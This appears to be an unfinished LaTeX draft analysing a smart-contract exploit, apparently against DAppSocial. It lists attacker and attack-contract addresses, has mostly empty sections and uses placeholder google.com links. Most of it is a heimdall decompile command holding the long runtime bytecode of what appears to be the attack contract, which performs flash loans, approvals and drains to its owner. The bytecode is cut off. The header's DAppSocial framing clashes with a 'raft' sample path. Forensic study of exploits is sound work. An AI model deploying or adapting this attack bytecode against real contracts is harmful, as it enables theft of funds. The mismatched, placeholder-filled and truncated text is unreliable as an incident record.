% @KeyInfo - Total Lost : ~3.2 M USD$
% Attacker : https://etherscan.io/address/0xc1f2b71a502b551a65eee9c96318afdd5fd439fa
% Attack Contract : https://etherscan.io/address/0x0a3340129816a86b62b7eafd61427f743c315ef8
% Vulnerable Contract : https://etherscan.io/address/0x9ab6b21cdf116f611110b048987e58894786c244
% Attack Tx :https://etherscan.io/tx/0xfeedbf51b4e2338e38171f6e19501327294ab1907ab44cfd2d7e7336c975ace7

% @Info
% Vulnerable Contract Code : https://etherscan.io/address/0x9ab6b21cdf116f611110b048987e58894786c244#code

% @Analysis
% Post-mortem : https://www.google.com/
% Twitter Guy : https://twitter.com/BlockSecTeam/status/1723229393529835972
% Hacking God : https://www.google.com/

\section{Overview}

\section{Timeline}

\subsection{Setup}

\href{\urltxdappsocialsetupcreation}{Contract creation}:

\begin{lstlisting}[language=Json]

\end{lstlisting}

\subsection{Funding}

\href{\urltxdappsocialsetupusdt}{USDT funding}:

\begin{lstlisting}[language=Json]

\end{lstlisting}

\href{\urltxdappsocialsetupusdc}{USDC funding}:

\begin{lstlisting}[language=Json]

\end{lstlisting}

\subsection{Exploit}

The exploit is \href{\urltxdappsocialexploit}{called with the address of DAppSocial}:

\begin{lstlisting}[language=Json]

\end{lstlisting}

inputs: DappSocial address is not in the runtime nor creation bytecode of any contract (attack / helper)

\section{Simulation}

\subsection{Known}

Contract creator:

Creation bytecode:

Runtime bytecode:

\subsection{Guessing}

\subsubsection{Fuzzing Patterns}

\begin{lstlisting}[language=Python]
['0x000000000000000000000000aaaaaaabaaacaaadaaaeaaafaab0aab1aab2aab3', '0x000000000000000000000000aab4aab5aab6aab7aab8aab9aabaaabbaabcaabd', '0x000000000000000000000000aabeaabfaac0aac1aac2aac3aac4aac5aac6aac7', '0x000000000000000000000000aac8aac9aacaaacbaaccaacdaaceaacfaad0aad1', '0x000000000000000000000000aad2aad3aad4aad5aad6aad7aad8aad9aadaaadb', '0x000000000000000000000000aadcaaddaadeaadfaae0aae1aae2aae3aae4aae5', '0x000000000000000000000000aae6aae7aae8aae9aaeaaaebaaecaaedaaeeaaef', '0x000000000000000000000000aaf0aaf1aaf2aaf3aaf4aaf5aaf6aaf7aaf8aaf9', '0x000000000000000000000000aafaaafbaafcaafdaafeaaffab00ab01ab02ab03', '0x000000000000000000000000ab04ab05ab06ab07ab08ab09ab0aab0bab0cab0d', '0x000000000000000000000000ab0eab0fab10ab11ab12ab13ab14ab15ab16ab17', '0x000000000000000000000000ab18ab19ab1aab1bab1cab1dab1eab1fab20ab21', '0x000000000000000000000000ab22ab23ab24ab25ab26ab27ab28ab29ab2aab2b', '0x000000000000000000000000ab2cab2dab2eab2fab30ab31ab32ab33ab34ab35', '0x000000000000000000000000ab36ab37ab38ab39ab3aab3bab3cab3dab3eab3f', '0x000000000000000000000000ab40ab41ab42ab43ab44ab45ab46ab47ab48ab49']
['0xab4aab4bab4cab4dab4eab4fab50ab51ab52ab53ab54ab55ab56ab57ab58ab59', '0xab5aab5bab5cab5dab5eab5fab60ab61ab62ab63ab64ab65ab66ab67ab68ab69', '0xab6aab6bab6cab6dab6eab6fab70ab71ab72ab73ab74ab75ab76ab77ab78ab79', '0xab7aab7bab7cab7dab7eab7fab80ab81ab82ab83ab84ab85ab86ab87ab88ab89', '0xab8aab8bab8cab8dab8eab8fab90ab91ab92ab93ab94ab95ab96ab97ab98ab99', '0xab9aab9bab9cab9dab9eab9faba0aba1aba2aba3aba4aba5aba6aba7aba8aba9', '0xabaaabababacabadabaeabafabb0abb1abb2abb3abb4abb5abb6abb7abb8abb9', '0xabbaabbbabbcabbdabbeabbfabc0abc1abc2abc3abc4abc5abc6abc7abc8abc9', '0xabcaabcbabccabcdabceabcfabd0abd1abd2abd3abd4abd5abd6abd7abd8abd9', '0xabdaabdbabdcabddabdeabdfabe0abe1abe2abe3abe4abe5abe6abe7abe8abe9', '0xabeaabebabecabedabeeabefabf0abf1abf2abf3abf4abf5abf6abf7abf8abf9', '0xabfaabfbabfcabfdabfeabffac00ac01ac02ac03ac04ac05ac06ac07ac08ac09', '0xac0aac0bac0cac0dac0eac0fac10ac11ac12ac13ac14ac15ac16ac17ac18ac19', '0xac1aac1bac1cac1dac1eac1fac20ac21ac22ac23ac24ac25ac26ac27ac28ac29', '0xac2aac2bac2cac2dac2eac2fac30ac31ac32ac33ac34ac35ac36ac37ac38ac39', '0xac3aac3bac3cac3dac3eac3fac40ac41ac42ac43ac44ac45ac46ac47ac48ac49']
\end{lstlisting}

\subsubsection{The Selector(s ?)}

Bruteforce the following process and apply to each selector:

\begin{lstlisting}[language=Shell]
heimdall decompile --include-sol -o samples/raft/contracts/main.runtime.heimdall.sol -- 0x6080604052600436106200010f5760003560e01c8063920f5c841162000097578063ce3b12fd1162000061578063ce3b12fd14620002c8578063d27b491514620002f6578063d34295011462000316578063fa461e3314620003365762000117565b8063920f5c84146200023e578063b529c6121462000282578063be2821b014620002a2578063c92a580714620002ae5762000117565b80634aa9f8ac11620000d95780634aa9f8ac14620001b45780634c15fb9414620001d45780637e77e46814620002025780638237e538146200020e5762000117565b806311702872146200011c57806323e30c8b146200014a5780633b0113a4146200018e5780633f6a5f0e14620001a85762000117565b366200011757005b600080fd5b3480156200012957600080fd5b5062000148600480360381019062000142919062003243565b62000364565b005b3480156200015757600080fd5b5062000176600480360381019062000170919062003348565b6200045c565b6040516200018591906200340d565b60405180910390f35b3480156200019b57600080fd5b50620001a66200060b565b005b620001b262000682565b005b620001d26004803603810190620001cc91906200342a565b62000ac2565b005b348015620001e157600080fd5b50620002006004803603810190620001fa919062003471565b62000f50565b005b6200020c6200132d565b005b3480156200021b57600080fd5b506200022662001698565b6040516200023591906200340d565b60405180910390f35b3480156200024b57600080fd5b506200026a600480360381019062000264919062003576565b620016bc565b604051620002799190620036a8565b60405180910390f35b620002a060048036038101906200029a919062003243565b62001c1d565b005b620002ac62001ff5565b005b348015620002bb57600080fd5b50620002c66200231c565b005b348015620002d557600080fd5b50620002f46004803603810190620002ee9190620036f6565b62002393565b005b6200031460048036038101906200030e919062003768565b6200253c565b005b6200033460048036038101906200032e919062003768565b62002698565b005b3480156200034357600080fd5b506200036260048036038101906200035c9190620037d5565b62002a03565b005b602760009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614620003bf57600080fd5b60128160148110620003d657620003d562003855565b5b0160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16630721348d6040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156200044057600080fd5b505af115801562000455573d6000803e3d6000fd5b5050505050565b6000600b60009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614620004b957600080fd5b6000602660009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166323e30c8b60e01b89898989898960405160240162000519969594939291906200390a565b604051602081830303815290604052907bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff8381831617835250505050604051620005859190620039e9565b600060405180830381855af49150503d8060008114620005c2576040519150601f19603f3d011682016040523d82523d6000602084013e620005c7565b606091505b505090506001151581151514620005dd57600080fd5b7f439148f0bbc682ca079e46d6e2c2f0c1e3b820f1a291b069d8882abf8cf18dd99150509695505050505050565b602760009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16146200066657600080fd5b601160008154809291906200067b9062003a31565b9190505550565b602760009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614620006dd57600080fd5b6000602660009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633f6a5f0e60e01b604051602401620007319062003ab9565b604051602081830303815290604052907bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff83818316178352505050506040516200079d9190620039e9565b600060405180830381855af49150503d8060008114620007da576040519150601f19603f3d011682016040523d82523d6000602084013e620007df565b606091505b505090506001151581151514620007f557600080fd5b600c60009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663ce7d6503476000600147600a6009476200084a919062003adb565b62000856919062003b55565b6001306040518863ffffffff1660e01b81526004016200087c9695949392919062003c1d565b6000604051808303818588803b1580156200089657600080fd5b505af1158015620008ab573d6000803e3d6000fd5b5050505050604051620008be90620031f0565b604051809103906000f080158015620008db573d6000803e3d6000fd5b50601260115460148110620008f557620008f462003855565b5b0160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a9059cbb6012601154601481106200098b576200098a62003855565b5b0160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16671bc16d674ec800006040518363ffffffff1660e01b8152600401620009d592919062003ccd565b600060405180830381600087803b158015620009f057600080fd5b505af115801562000a05573d6000803e3d6000fd5b5050505060126011546014811062000a225762000a2162003855565b5b0160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663c5d9a3596040518163ffffffff1660e01b8152600401600060405180830381600087803b15801562000a8c57600080fd5b505af115801562000aa1573d6000803e3d6000fd5b505050506011600081548092919062000aba9062003a31565b919050555050565b602760009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161462000b1d57600080fd5b60606000838360405160200162000b379392919062003cfa565b60405160208183030381529060405290506000600167ffffffffffffffff81111562000b685762000b6762003d37565b5b60405190808252806020026020018201604052801562000b975781602001602082028036833780820191505090505b509050600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff168160008151811062000bd45762000bd362003855565b5b602002602001019073ffffffffffffffffffffffffffffffffffffffff16908173ffffffffffffffffffffffffffffffffffffffff16815250506000600167ffffffffffffffff81111562000c2e5762000c2d62003d37565b5b60405190808252806020026020018201604052801562000c5d5781602001602082028036833780820191505090505b50905069014542ba12a337c000008160008151811062000c825762000c8162003855565b5b6020026020010181815250506000600167ffffffffffffffff81111562000cae5762000cad62003d37565b5b60405190808252806020026020018201604052801562000cdd5781602001602082028036833780820191505090505b509050600a60009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663ab9c4b5d30858585308a60006040518863ffffffff1660e01b815260040162000d4a979695949392919062003f8a565b600060405180830381600087803b15801562000d6557600080fd5b505af115801562000d7a573d6000803e3d6000fd5b505050506000600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166370a08231306040518263ffffffff1660e01b815260040162000ddd919062004023565b602060405180830381865afa15801562000dfb573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019062000e21919062004057565b9050600c60009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663ce7d65036001600084600a60088762000e77919062003adb565b62000e83919062003b55565b6001306040518763ffffffff1660e01b815260040162000ea99695949392919062004089565b600060405180830381600087803b15801562000ec457600080fd5b505af115801562000ed9573d6000803e3d6000fd5b50505050602760009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc479081150290604051600060405180830381858888f1935050505015801562000f46573d6000803e3d6000fd5b5050505050505050565b602760009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161462000fab57600080fd5b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff16036200117a5760008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166370a08231306040518263ffffffff1660e01b815260040162001096919062004023565b602060405180830381865afa158015620010b4573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190620010da919062004057565b6040518263ffffffff1660e01b8152600401620010f89190620040f6565b600060405180830381600087803b1580156200111357600080fd5b505af115801562001128573d6000803e3d6000fd5b505050503373ffffffffffffffffffffffffffffffffffffffff166108fc479081150290604051600060405180830381858888f1935050505015801562001173573d6000803e3d6000fd5b506200126a565b8173ffffffffffffffffffffffffffffffffffffffff1663a9059cbb338473ffffffffffffffffffffffffffffffffffffffff166370a08231306040518263ffffffff1660e01b8152600401620011d2919062004023565b602060405180830381865afa158015620011f0573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019062001216919062004057565b6040518363ffffffff1660e01b81526004016200123592919062004113565b600060405180830381600087803b1580156200125057600080fd5b505af115801562001265573d6000803e3d6000fd5b505050505b600081146200132957601260018262001284919062004140565b6014811062001298576200129762003855565b5b0160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663aa429e66836040518263ffffffff1660e01b8152600401620012f4919062004023565b600060405180830381600087803b1580156200130f57600080fd5b505af115801562001324573d6000803e3d6000fd5b505050505b5050565b602760009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16146200138857600080fd5b606060006040516020016200139e919062004023565b6040516020818303038152906040529050600b60009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16635cffe9de30600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff166a295be96e64066972000000856040518563ffffffff1660e01b81526004016200143f9493929190620041be565b6020604051808303816000875af11580156200145f573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019062001485919062004229565b506040516200149490620031f0565b604051809103906000f080158015620014b1573d6000803e3d6000fd5b50601260115460148110620014cb57620014ca62003855565b5b0160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a9059cbb60126011546014811062001561576200156062003855565b5b0160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16671bc16d674ec800006040518363ffffffff1660e01b8152600401620015ab92919062003ccd565b600060405180830381600087803b158015620015c657600080fd5b505af1158015620015db573d6000803e3d6000fd5b50505050601260115460148110620015f857620015f762003855565b5b0160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663c5d9a3596040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156200166257600080fd5b505af115801562001677573d6000803e3d6000fd5b5050505060116000815480929190620016909062003a31565b919050555050565b7f439148f0bbc682ca079e46d6e2c2f0c1e3b820f1a291b069d8882abf8cf18dd981565b6000806000808585810190620016d39190620042a0565b925092509250600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a9059cbb600760009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166370a08231306040518263ffffffff1660e01b815260040162001797919062004023565b602060405180830381865afa158015620017b5573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190620017db919062004057565b6040518363ffffffff1660e01b8152600401620017fa92919062004113565b600060405180830381600087803b1580156200181557600080fd5b505af11580156200182a573d6000803e3d6000fd5b50505050600073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff16036200194257600760009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632f86556860126001601154620018b4919062004140565b60148110620018c857620018c762003855565b5b0160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff166040518263ffffffff1660e01b815260040162001908919062004023565b600060405180830381600087803b1580156200192357600080fd5b505af115801562001938573d6000803e3d6000fd5b50505050620019d4565b600760009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632f865568846040518263ffffffff1660e01b81526004016200199f919062004023565b600060405180830381600087803b158015620019ba57600080fd5b505af1158015620019cf573d6000803e3d6000fd5b505050505b6000602660009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663ee4d195d60e01b60405160240162001a289062003ab9565b604051602081830303815290604052907bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff838183161783525050505060405162001a949190620039e9565b600060405180830381855af49150503d806000811462001ad1576040519150601f19603f3d011682016040523d82523d6000602084013e62001ad6565b606091505b50509050600115158115151462001aec57600080fd5b602660009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a64ed55660e01b848460405160240162001b42929190620042fc565b604051602081830303815290604052907bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff838183161783525050505060405162001bae9190620039e9565b600060405180830381855af49150503d806000811462001beb576040519150601f19603f3d011682016040523d82523d6000602084013e62001bf0565b606091505b505080915050600115158115151462001c0857600080fd5b60019450505050509998505050505050505050565b602760009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161462001c7857600080fd5b62001c8262002cf0565b600c60009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663ce7d6503476000600147600a60094762001cd7919062003adb565b62001ce3919062003b55565b6001306040518863ffffffff1660e01b815260040162001d099695949392919062003c1d565b6000604051808303818588803b15801562001d2357600080fd5b505af115801562001d38573d6000803e3d6000fd5b5050505050600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166370a08231306040518263ffffffff1660e01b815260040162001d9a919062004023565b602060405180830381865afa15801562001db8573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019062001dde919062004057565b50600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663095ea7b3600760009054906101000a900473ffffffffffffffffffffffffffffffffffffffff167fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff6040518363ffffffff1660e01b815260040162001e8092919062004113565b600060405180830381600087803b15801562001e9b57600080fd5b505af115801562001eb0573d6000803e3d6000fd5b5050505060006040518060c00160405280600073ffffffffffffffffffffffffffffffffffffffff1681526020016000815260200160008152602001600060ff1681526020016000801b81526020016000801b8152509050600760009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663171672b1600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1630670de0b6b3a76400008662001f80919062003adb565b600168a2a15d09519be000006001670de0b6b3a7640000896040518963ffffffff1660e01b815260040162001fbd98979695949392919062004465565b600060405180830381600087803b15801562001fd857600080fd5b505af115801562001fed573d6000803e3d6000fd5b505050505050565b602760009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16146200205057600080fd5b600c60009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663ce7d6503476000600147600a600947620020a5919062003adb565b620020b1919062003b55565b6001306040518863ffffffff1660e01b8152600401620020d79695949392919062003c1d565b6000604051808303818588803b158015620020f157600080fd5b505af115801562002106573d6000803e3d6000fd5b50505050506040516200211990620031f0565b604051809103906000f08015801562002136573d6000803e3d6000fd5b5060126011546014811062002150576200214f62003855565b5b0160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a9059cbb601260115460148110620021e657620021e562003855565b5b0160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16671bc16d674ec800006040518363ffffffff1660e01b81526004016200223092919062003ccd565b600060405180830381600087803b1580156200224b57600080fd5b505af115801562002260573d6000803e3d6000fd5b505050506012601154601481106200227d576200227c62003855565b5b0160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663c5d9a3596040518163ffffffff1660e01b8152600401600060405180830381600087803b158015620022e757600080fd5b505af1158015620022fc573d6000803e3d6000fd5b5050505060116000815480929190620023159062003a31565b9190505550565b602760009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16146200237757600080fd5b601160008154809291906200238c90620044f3565b9190505550565b602760009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614620023ee57600080fd5b60006040518060c00160405280600073ffffffffffffffffffffffffffffffffffffffff1681526020016000815260200160008152602001600060ff1681526020016000801b81526020016000801b8152509050600760009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663171672b1600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1630670de0b6b3a764000089620024ba919062003adb565b88670de0b6b3a764000089620024d1919062003adb565b88670de0b6b3a7640000896040518963ffffffff1660e01b81526004016200250198979695949392919062004521565b600060405180830381600087803b1580156200251c57600080fd5b505af115801562002531573d6000803e3d6000fd5b505050505050505050565b602760009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16146200259757600080fd5b606081604051602001620025ac919062004023565b6040516020818303038152906040529050600b60009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16635cffe9de30600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff166a295be96e64066972000000856040518563ffffffff1660e01b81526004016200264d9493929190620041be565b6020604051808303816000875af11580156200266d573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019062002693919062004229565b505050565b602760009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614620026f357600080fd5b60608160405160200162002708919062004023565b6040516020818303038152906040529050600b60009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16635cffe9de30600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff166a295be96e64066972000000856040518563ffffffff1660e01b8152600401620027a99493929190620041be565b6020604051808303816000875af1158015620027c9573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190620027ef919062004229565b50604051620027fe90620031f0565b604051809103906000f0801580156200281b573d6000803e3d6000fd5b5060126011546014811062002835576200283462003855565b5b0160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a9059cbb601260115460148110620028cb57620028ca62003855565b5b0160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16671bc16d674ec800006040518363ffffffff1660e01b81526004016200291592919062003ccd565b600060405180830381600087803b1580156200293057600080fd5b505af115801562002945573d6000803e3d6000fd5b5050505060126011546014811062002962576200296162003855565b5b0160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663c5d9a3596040518163ffffffff1660e01b8152600401600060405180830381600087803b158015620029cc57600080fd5b505af1158015620029e1573d6000803e3d6000fd5b5050505060116000815480929190620029fa9062003a31565b91905055505050565b600e60009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16148062002aad5750600f60009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16145b8062002b065750601060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16145b62002b1057600080fd5b600084131562002bfd573373ffffffffffffffffffffffffffffffffffffffff16630dfe16816040518163ffffffff1660e01b8152600401602060405180830381865afa15801562002b66573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019062002b8c9190620045c6565b73ffffffffffffffffffffffffffffffffffffffff1663a9059cbb33866040518363ffffffff1660e01b815260040162002bc892919062004113565b600060405180830381600087803b15801562002be357600080fd5b505af115801562002bf8573d6000803e3d6000fd5b505050505b600083131562002cea573373ffffffffffffffffffffffffffffffffffffffff1663d21220a76040518163ffffffff1660e01b8152600401602060405180830381865afa15801562002c53573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019062002c799190620045c6565b73ffffffffffffffffffffffffffffffffffffffff1663a9059cbb33856040518363ffffffff1660e01b815260040162002cb592919062004113565b600060405180830381600087803b15801562002cd057600080fd5b505af115801562002ce5573d6000803e3d6000fd5b505050505b50505050565b600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663095ea7b3600a60009054906101000a900473ffffffffffffffffffffffffffffffffffffffff167fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff6040518363ffffffff1660e01b815260040162002d9192919062004113565b600060405180830381600087803b15801562002dac57600080fd5b505af115801562002dc1573d6000803e3d6000fd5b50505050600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663095ea7b3600c60009054906101000a900473ffffffffffffffffffffffffffffffffffffffff167fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff6040518363ffffffff1660e01b815260040162002e6692919062004113565b600060405180830381600087803b15801562002e8157600080fd5b505af115801562002e96573d6000803e3d6000fd5b50505050600860009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663095ea7b3600760009054906101000a900473ffffffffffffffffffffffffffffffffffffffff167fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff6040518363ffffffff1660e01b815260040162002f3b92919062004113565b600060405180830381600087803b15801562002f5657600080fd5b505af115801562002f6b573d6000803e3d6000fd5b50505050600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663095ea7b3600a60009054906101000a900473ffffffffffffffffffffffffffffffffffffffff167fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff6040518363ffffffff1660e01b81526004016200301092919062004113565b600060405180830381600087803b1580156200302b57600080fd5b505af115801562003040573d6000803e3d6000fd5b50505050600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663095ea7b3600b60009054906101000a900473ffffffffffffffffffffffffffffffffffffffff167fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff6040518363ffffffff1660e01b8152600401620030e592919062004113565b600060405180830381600087803b1580156200310057600080fd5b505af115801562003115573d6000803e3d6000fd5b50505050600860009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663095ea7b3600d60009054906101000a900473ffffffffffffffffffffffffffffffffffffffff167fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff6040518363ffffffff1660e01b8152600401620031ba92919062004113565b600060405180830381600087803b158015620031d557600080fd5b505af1158015620031ea573d6000803e3d6000fd5b50505050565b61134780620045f983390190565b600080fd5b600080fd5b6000819050919050565b6200321d8162003208565b81146200322957600080fd5b50565b6000813590506200323d8162003212565b92915050565b6000602082840312156200325c576200325b620031fe565b5b60006200326c848285016200322c565b91505092915050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000620032a28262003275565b9050919050565b620032b48162003295565b8114620032c057600080fd5b50565b600081359050620032d481620032a9565b92915050565b600080fd5b600080fd5b600080fd5b60008083601f840112620033025762003301620032da565b5b8235905067ffffffffffffffff811115620033225762003321620032df565b5b602083019150836001820283011115620033415762003340620032e4565b5b9250929050565b60008060008060008060a08789031215620033685762003367620031fe565b5b60006200337889828a01620032c3565b96505060206200338b89828a01620032c3565b95505060406200339e89828a016200322c565b9450506060620033b189828a016200322c565b935050608087013567ffffffffffffffff811115620033d557620033d462003203565b5b620033e389828a01620032e9565b92509250509295509295509295565b6000819050919050565b6200340781620033f2565b82525050565b6000602082019050620034246000830184620033fc565b92915050565b60008060408385031215620034445762003443620031fe565b5b600062003454858286016200322c565b925050602062003467858286016200322c565b9150509250929050565b600080604083850312156200348b576200348a620031fe565b5b60006200349b85828601620032c3565b9250506020620034ae858286016200322c565b9150509250929050565b60008083601f840112620034d157620034d0620032da565b5b8235905067ffffffffffffffff811115620034f157620034f0620032df565b5b60208301915083602082028301111562003510576200350f620032e4565b5b9250929050565b60008083601f84011262003530576200352f620032da565b5b8235905067ffffffffffffffff81111562003550576200354f620032df565b5b6020830191508360208202830111156200356f576200356e620032e4565b5b9250929050565b600080600080600080600080600060a08a8c0312156200359